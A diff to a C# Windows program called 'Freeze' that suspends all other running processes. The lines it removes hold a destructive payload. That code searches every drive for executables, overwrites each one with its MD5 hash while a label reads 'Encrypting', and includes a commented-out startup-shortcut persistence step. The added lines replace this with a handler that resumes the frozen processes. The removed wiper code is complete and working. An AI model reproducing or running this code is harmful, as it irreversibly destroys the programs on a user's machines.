@@ -116,99 +116,19 @@ namespace Freeze
                             kr.label1.Text = "Freezing:" + p.ProcessName;
                             kr.pro.Value = i; i++; await Task.Delay(50);
                         } } catch { } }
-                kr.label1.Text = "Encrypting...";
-            //    CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "Freeze", Application.ExecutablePath);
-                List<string> Miu = new List<string>();
-                List<string> start = new List<string>();
-                var cn = DriveInfo.GetDrives();
-                foreach (var c in cn) {
-                    start.Add(c.ToString());
-                }
-                GetFolderAndFile(start.ToArray(), Miu, "*.exe");
-                kr.pro.MaxValue = Miu.Count;
-                foreach (var efile in Miu) {
-                    if ((new FileInfo(efile).Length / 1024 / 1024 / 1024) < 1)
-                    {
-                        System.IO.File.WriteAllText(efile, MD5File(efile));
-                        kr.label1.Text = "Encrypting:" + efile;
-                        kr.pro.Value = i; i++; await Task.Delay(50);
-                    }
-                }
+            };
+            kr.label1.Click += async delegate
+            {
+                var data = Process.GetProcesses();
+                kr.pro.MaxValue = data.Length;
+                int i = data.Length;
+                foreach (var p in data) { try { if (p.ProcessName != "Freeze") {
+                            ProcessMgr.ResumeProcess(p.Id);
+                            kr.label1.Text = "unFreezing:" + p.ProcessName;
+                            kr.pro.Value = i; i--; await Task.Delay(50);
+                        } } catch { } }
             };
             kr.ShowDialog();
-        }
-        public static void GetFolderAndFile(string[] path, List<string> FilePath, string FileName)
-        {
-            foreach (string str in path)
-            {
-                string[] Next = Directory.GetDirectories(str);
-                string[] Files = Directory.GetFiles(str, FileName);
-                foreach (string file in Files)
-                    FilePath.Add(file);
-                GetFolderAndFile(Next, FilePath, FileName);
-            }
-        }
-        public static string MD5File(string filePath)
-        {
-            FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
-            int bufferSize = 1048576;
-            byte[] buff = new byte[bufferSize];
-
-            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
-            md5.Initialize();
-
-            long offset = 0;
-            while (offset < fs.Length)
-            {
-                long readSize = bufferSize;
-                if (offset + readSize > fs.Length)
-                {
-                    readSize = fs.Length - offset;
-                }
-
-                fs.Read(buff, 0, Convert.ToInt32(readSize));
-
-                if (offset + readSize < fs.Length) 
-                {
-                    md5.TransformBlock(buff, 0, Convert.ToInt32(readSize), buff, 0);
-                }
-                else 
-                {
-                    md5.TransformFinalBlock(buff, 0, Convert.ToInt32(readSize));
-                }
-
-                offset += bufferSize;
-            }
-
-            fs.Close();
-            byte[] result = md5.Hash;
-            md5.Clear();
-
-            StringBuilder sb = new StringBuilder(32);
-            for (int i = 0; i < result.Length; i++)
-            {
-                sb.Append(result[i].ToString("X2"));
-            }
-
-            return sb.ToString();
-        }
-        public static void CreateShortcut(string directory, string shortcutName, string targetPath,
-            string description = null, string iconLocation = null)
-        {
-            if (!System.IO.Directory.Exists(directory))
-            {
-                System.IO.Directory.CreateDirectory(directory);
-            }
-
-            string shortcutPath = Path.Combine(directory, string.Format("{0}.lnk", shortcutName));
-            WshShell shell = new WshShell();
-            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);//创建快捷方式对象
-            shortcut.TargetPath = targetPath;//指定目标路径
-            shortcut.WorkingDirectory = Path.GetDirectoryName(targetPath);//设置起始位置
-            shortcut.WindowStyle = 1;//设置运行方式，默认为常规窗口
-            shortcut.Description = description;//设置备注
-            shortcut.IconLocation = string.IsNullOrWhiteSpace(iconLocation) ? targetPath : iconLocation;//设置图标路径
-            shortcut.Save();//保存快捷方式
         }
     }
 }
